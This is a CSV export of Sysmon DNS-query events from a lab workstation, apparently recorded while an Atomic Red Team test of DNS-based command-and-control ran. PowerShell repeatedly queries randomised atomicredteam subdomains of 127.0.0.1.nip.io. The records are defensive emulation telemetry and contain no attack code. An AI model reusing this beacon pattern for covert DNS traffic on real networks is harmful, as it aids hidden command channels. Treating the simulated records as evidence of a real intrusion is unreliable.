"2025-12-22 13:58:32.943 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165826,"Query: atomicredteam-527063.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:32.006","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:32.943 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165827,"Query: atomicredteam-462983.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:32.174","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:32.943 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165828,"Query: atomicredteam-967882.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:32.218","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:32.943 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165829,"Query: atomicredteam-15103.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:32.263","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.947 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165830,"Query: atomicredteam-376358.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:32.439","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.947 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165831,"Query: atomicredteam-547668.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:32.482","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.947 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165832,"Query: atomicredteam-423847.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:32.525","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.948 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165833,"Query: atomicredteam-868673.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:32.845","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.948 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165834,"Query: atomicredteam-689037.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.015","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.948 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165835,"Query: atomicredteam-548467.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.059","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.948 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165836,"Query: atomicredteam-390609.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.103","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.948 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165837,"Query: atomicredteam-987365.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.148","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.949 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165838,"Query: atomicredteam-715894.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.192","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.949 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165839,"Query: atomicredteam-771540.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.236","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.949 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165840,"Query: atomicredteam-317768.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.281","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.949 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165841,"Query: atomicredteam-345582.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.326","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.949 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165842,"Query: atomicredteam-200678.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.369","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.949 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165843,"Query: atomicredteam-775202.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.413","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.950 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165844,"Query: atomicredteam-666404.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.456","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.950 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165845,"Query: atomicredteam-638322.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.631","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.950 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165846,"Query: atomicredteam-540648.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.674","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.950 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165847,"Query: atomicredteam-537485.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.718","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.950 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165848,"Query: atomicredteam-441382.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.763","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:33.950 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165849,"Query: atomicredteam-750892.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.806","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:34.958 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165850,"Query: atomicredteam-141208.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:33.850","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:34.958 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165851,"Query: atomicredteam-43900.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:34.023","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:34.958 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165852,"Query: atomicredteam-615671.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:34.068","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:34.959 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165853,"Query: atomicredteam-987464.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:34.111","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:34.959 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165854,"Query: atomicredteam-142693.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:34.155","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:34.959 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165855,"Query: atomicredteam-411192.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:34.197","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:34.959 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165856,"Query: atomicredteam-747879.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:34.517","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.973 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165857,"Query: atomicredteam-47138.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:34.837","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.973 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165858,"Query: atomicredteam-550123.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.008","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.973 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165859,"Query: atomicredteam-873158.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.053","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.973 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165860,"Query: atomicredteam-320342.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.098","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.973 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165861,"Query: atomicredteam-656121.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.141","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.973 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165862,"Query: atomicredteam-69005.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.185","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.973 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165863,"Query: atomicredteam-788787.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.230","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.973 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165864,"Query: atomicredteam-750318.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.273","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.973 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165865,"Query: atomicredteam-273066.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.316","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.973 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165866,"Query: atomicredteam-775743.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.360","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.973 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165867,"Query: atomicredteam-831111.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.680","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.974 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165868,"Query: atomicredteam-597475.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.722","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.974 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165869,"Query: atomicredteam-38570.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.767","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.974 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165870,"Query: atomicredteam-750662.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.810","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.974 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165871,"Query: atomicredteam-741781.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.853","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:35.974 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165872,"Query: atomicredteam-766452.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.897","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:36.993 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165873,"Query: atomicredteam-290574.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:35.942","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:36.993 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165874,"Query: atomicredteam-318371.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:36.125","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
